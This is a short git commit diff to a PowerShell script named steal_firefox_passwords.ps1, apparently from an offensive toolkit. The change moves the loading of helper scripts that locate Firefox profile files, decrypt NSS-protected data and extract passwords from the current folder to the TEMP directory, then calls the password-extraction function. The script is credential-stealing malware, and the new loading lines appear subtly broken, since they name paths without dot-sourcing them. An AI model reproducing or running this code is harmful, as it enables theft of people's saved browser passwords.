2909ec0818db45dd8f8ef5a62b3d5d085693a1c2
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-07-07 11:53:55 +0200

    Update steal_firefox_passwords.ps1

--- api/stealing/firefox/steal_firefox_passwords.ps1
+++ api/stealing/firefox/steal_firefox_passwords.ps1
@@ -1,5 +1,6 @@
-. .\Find-FirefoxFiles.ps1
-. .\ConvertFrom-NSS.ps1
-. .\Get-FirefoxPasswords.ps1
+$tempdir = $env:TEMP
+$tempdir\firefox_stealing\Find-FirefoxFiles.ps1
+$tempdir\firefox_stealing\ConvertFrom-NSS.ps1
+$tempdir\firefox_stealing\Get-FirefoxPasswords.ps1
 
 Get-FirefoxPasswords
